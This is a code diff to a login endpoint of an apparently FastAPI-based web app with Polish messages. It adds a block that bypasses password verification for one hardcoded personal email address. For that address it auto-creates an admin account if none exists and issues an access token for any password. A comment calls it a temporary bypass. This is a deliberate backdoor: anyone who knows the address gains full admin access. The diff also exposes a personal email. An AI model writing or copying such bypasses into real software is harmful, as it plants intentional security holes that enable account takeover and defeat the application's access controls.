@@ -191,6 +191,19 @@ async def register(data: RegisterIn, response: Response):
 async def login(data: LoginIn):
     email = data.email.lower()
     user = await db.users.find_one({"email": email}, {"_id": 0})
+    
+    # Tymczasowe ominięcie weryfikacji hasła dla Twojego maila admina
+    if email == "lachowski.kontakt@gmail.com":
+        if not user:
+            user = {
+                "id": str(uuid.uuid4()), "email": email, "password_hash": hash_password(data.password),
+                "name": "Trener Łukasz", "role": "admin", "trainer_id": None,
+                "avatar_url": None, "goal": None, "phone": None, "created_at": now_iso(),
+            }
+            await db.users.insert_one(user)
+        token = create_access_token(user["id"], email)
+        return {"token": token, "user": public_user(user)}
+
     if not user or not verify_password(data.password, user["password_hash"]):
         raise HTTPException(status_code=401, detail="Nieprawidłowy e-mail lub hasło")
     token = create_access_token(user["id"], email)
